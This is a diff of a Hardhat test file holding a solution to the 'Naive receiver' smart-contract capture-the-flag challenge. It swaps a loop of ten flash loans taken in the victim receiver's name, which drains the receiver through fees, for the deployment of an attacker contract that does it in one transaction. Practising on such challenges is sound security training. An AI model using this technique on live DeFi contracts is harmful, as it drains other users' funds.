@@ -38,12 +38,18 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        //Using multiple transactions by calling executing the flash loan through the receiver address
-        const ETH = await pool.ETH();
 
-        for(i=0; i<10; i++){
-            await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
-        };
+        // Using multiple transactions by calling executing the flash loan through the receiver address
+        // const ETH = await pool.ETH();
+
+        // for(i=0; i<10; i++){
+        //     await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
+        // };
+
+        // Using one transaction through the malicious naiveReceiverAttacker contract
+        const AttackerContractFactory = await ethers.getContractFactory('naiveReceiverAttacker', player);
+        await AttackerContractFactory.deploy(pool.address, receiver.address);
+
     });
 
     after(async function () {
